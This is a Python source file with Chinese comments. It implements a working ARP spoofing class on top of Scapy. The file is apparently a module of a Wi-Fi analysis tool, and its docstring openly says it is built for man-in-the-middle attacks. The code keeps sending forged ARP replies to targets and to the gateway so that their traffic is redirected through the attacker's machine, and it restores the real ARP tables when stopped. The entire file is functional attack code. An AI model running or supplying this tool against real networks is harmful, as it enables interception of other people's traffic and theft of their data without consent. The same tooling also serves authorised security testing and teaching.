"""
ARP欺骗器 - 发送伪造ARP包实现中间人攻击
"""
import threading
import time
import logging
from typing import List, Dict, Optional, Callable

try:
    from scapy.all import ARP, send, sendp, Ether
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

logger = logging.getLogger('wifi_analyzer.mitm')


class ARPSpoofer:
    """ARP欺骗器"""

    def __init__(self):
        self.is_spoofing = False
        self._spoof_thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        self._targets: Dict[str, dict] = {}  # target_ip -> {mac, gateway_ip, gateway_mac}
        self._interface: str = ""
        self._spoof_interval: float = 2.0  # 发送间隔（秒）
        self._packet_count: int = 0

    def add_target(self, target_ip: str, target_mac: str,
                   gateway_ip: str, gateway_mac: str) -> None:
        """
        添加欺骗目标

        :param target_ip: 目标IP
        :param target_mac: 目标MAC
        :param gateway_ip: 网关IP
        :param gateway_mac: 网关MAC
        """
        self._targets[target_ip] = {
            'mac': target_mac,
            'gateway_ip': gateway_ip,
            'gateway_mac': gateway_mac
        }
        logger.info(f"Added target: {target_ip}")

    def remove_target(self, target_ip: str) -> None:
        """移除欺骗目标"""
        if target_ip in self._targets:
            del self._targets[target_ip]
            logger.info(f"Removed target: {target_ip}")

    def clear_targets(self) -> None:
        """清除所有目标"""
        self._targets.clear()

    def start(self, interface: str = None) -> bool:
        """
        开始ARP欺骗

        :param interface: 网卡接口
        :return: 是否成功启动
        """
        if not SCAPY_AVAILABLE:
            logger.error("Scapy not available")
            return False

        if self.is_spoofing:
            logger.warning("Already spoofing")
            return False

        if not self._targets:
            logger.error("No targets configured")
            return False

        self._interface = interface
        self._stop_event.clear()
        self.is_spoofing = True
        self._packet_count = 0

        # 启动欺骗线程
        self._spoof_thread = threading.Thread(
            target=self._spoof_loop,
            daemon=True
        )
        self._spoof_thread.start()

        logger.info(f"ARP spoofing started for {len(self._targets)} targets")
        return True

    def stop(self) -> None:
        """停止ARP欺骗并恢复网络"""
        if not self.is_spoofing:
            return

        self._stop_event.set()
        self.is_spoofing = False

        if self._spoof_thread:
            self._spoof_thread.join(timeout=3)

        # 恢复目标ARP表
        self._restore_network()

        logger.info(f"ARP spoofing stopped. Total packets sent: {self._packet_count}")

    def _spoof_loop(self) -> None:
        """欺骗循环"""
        while not self._stop_event.is_set():
            try:
                for target_ip, target_info in self._targets.items():
                    target_mac = target_info['mac']
                    gateway_ip = target_info['gateway_ip']
                    gateway_mac = target_info['gateway_mac']

                    # 向目标发送伪造ARP（声称我们是网关）
                    result1 = self._send_arp_response(
                        target_ip=target_ip,
                        target_mac=target_mac,
                        spoofed_ip=gateway_ip,
                        interface=self._interface
                    )

                    # 向网关发送伪造ARP（声称我们是目标）
                    result2 = self._send_arp_response(
                        target_ip=gateway_ip,
                        target_mac=gateway_mac,
                        spoofed_ip=target_ip,
                        interface=self._interface
                    )

                    # 记录状态
                    if self._packet_count % 10 == 0:
                        logger.info(f"ARP spoofing active: {target_ip} <-> {gateway_ip}")

            except Exception as e:
                logger.error(f"Spoof loop error: {e}")

            # 等待下一次发送
            self._stop_event.wait(self._spoof_interval)

    def _send_arp_response(self, target_ip: str, target_mac: str,
                           spoofed_ip: str, interface: str = None) -> bool:
        """
        发送伪造ARP响应

        :param target_ip: 目标IP
        :param target_mac: 目标MAC
        :param spoofed_ip: 伪造的源IP
        :param interface: 网卡接口
        :return: 是否成功
        """
        try:
            # 创建完整的以太网+ARP包
            # Ether: 以太网层，指定目的MAC
            # ARP: ARP响应层
            packet = Ether(dst=target_mac) / ARP(
                op=2,  # ARP响应
                pdst=target_ip,
                hwdst=target_mac,
                psrc=spoofed_ip
            )

            # 使用sendp发送第2层包
            kwargs = {'verbose': 0}
            if interface:
                kwargs['iface'] = interface

            sendp(packet, **kwargs)
            self._packet_count += 1

            # 每发送10个包记录一次日志
            if self._packet_count % 10 == 1:
                logger.info(f"ARP sent: telling {target_ip} that {spoofed_ip} is at our MAC")

            return True

        except Exception as e:
            logger.error(f"Failed to send ARP to {target_ip}: {e}")
            return False

    def _restore_network(self) -> None:
        """
        恢复网络 - 发送正确的ARP包

        发送正确的ARP信息，让目标和网关恢复正确的ARP表
        """
        logger.info("Restoring network...")

        try:
            # 发送多次确保生效
            for _ in range(3):
                for target_ip, target_info in self._targets.items():
                    target_mac = target_info['mac']
                    gateway_ip = target_info['gateway_ip']
                    gateway_mac = target_info['gateway_mac']

                    # 告诉目标真正的网关MAC
                    self._send_correct_arp(
                        target_ip=target_ip,
                        target_mac=target_mac,
                        correct_ip=gateway_ip,
                        correct_mac=gateway_mac,
                        interface=self._interface
                    )

                    # 告诉网关真正的目标MAC
                    self._send_correct_arp(
                        target_ip=gateway_ip,
                        target_mac=gateway_mac,
                        correct_ip=target_ip,
                        correct_mac=target_mac,
                        interface=self._interface
                    )

                time.sleep(0.5)

        except Exception as e:
            logger.error(f"Failed to restore network: {e}")

    def _send_correct_arp(self, target_ip: str, target_mac: str,
                          correct_ip: str, correct_mac: str,
                          interface: str = None) -> None:
        """发送正确的ARP信息"""
        try:
            # 发送完整的以太网+ARP包，告知正确的MAC地址
            packet = Ether(dst=target_mac) / ARP(
                op=2,
                pdst=target_ip,
                hwdst=target_mac,
                psrc=correct_ip,
                hwsrc=correct_mac
            )

            kwargs = {'verbose': 0}
            if interface:
                kwargs['iface'] = interface

            sendp(packet, **kwargs)

        except Exception as e:
            logger.debug(f"Failed to send correct ARP: {e}")

    def get_statistics(self) -> dict:
        """获取统计信息"""
        return {
            'is_spoofing': self.is_spoofing,
            'target_count': len(self._targets),
            'packet_count': self._packet_count,
            'targets': list(self._targets.keys())
        }

    def set_interval(self, interval: float) -> None:
        """设置发送间隔"""
        if interval > 0:
            self._spoof_interval = interval